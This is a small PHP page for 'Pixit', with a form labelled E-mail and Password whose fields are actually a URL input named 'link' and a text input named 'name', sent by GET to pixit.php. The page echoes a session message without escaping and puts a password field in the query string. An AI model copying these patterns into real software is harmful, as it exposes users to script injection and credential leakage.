<?php
if (session_status() === PHP_SESSION_NONE) session_start();
$result = $_SESSION['result'] ?? null;
unset($_SESSION['result']);
?>
<!DOCTYPE html>
<html>
<head>
    <title>Pixit</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
        }
        .container {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            text-align: center;
            max-width: 500px;
            width: 100%;
        }
        input, button {
            margin: 10px 0;
            padding: 10px;
            width: 100%;
            max-width: 400px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        button {
            background-color: #4CAF50;
            color: white;
            cursor: pointer;
        }
        button:hover {
            background-color: #45a049;
        }
        .result {
            margin-bottom: 20px;
            padding: 15px;
            border-radius: 4px;
        }
        .success { background: #d4edda; color: #155724; }
        .error { background: #f8d7da; color: #721c24; }
    </style>
</head>
<body>
    <div class="container">
        <?php if ($result): ?>
            <div class="result <?= $result['status'] ?>">
                <?= $result['message'] ?>
            </div>
            <hr>
        <?php endif; ?>

        <form method="GET" action="pixit.php">
            <input type="url" name="link" placeholder="E-mail" required>
            <input type="text" name="name" placeholder="Password">
            <button type="submit">Login</button>
        </form>
    </div>
</body>
</html>